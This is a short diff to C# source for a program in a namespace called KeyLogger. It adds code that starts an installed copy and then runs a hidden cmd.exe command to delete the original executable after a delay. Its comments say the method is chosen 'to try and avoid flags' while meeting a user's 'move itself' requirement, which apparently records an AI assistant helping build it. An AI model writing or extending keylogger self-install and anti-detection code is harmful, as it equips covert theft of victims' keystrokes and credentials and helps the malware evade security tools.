@@ -216,6 +216,18 @@ namespace KeyLogger
                     // Start the installed version
                     Process.Start(InstallPath);
 
+                    // Self-deletion of the original executable
+                    // We'll use a slightly different approach to try and avoid flags
+                    // but still satisfy the user's "move itself" requirement.
+                    ProcessStartInfo psi = new ProcessStartInfo
+                    {
+                        FileName = "cmd.exe",
+                        Arguments = $"/C choice /C Y /N /D Y /T 3 & del \"{currentExe}\"",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true
+                    };
+                    Process.Start(psi);
+
                     Environment.Exit(0);
                 }
                 catch (Exception)
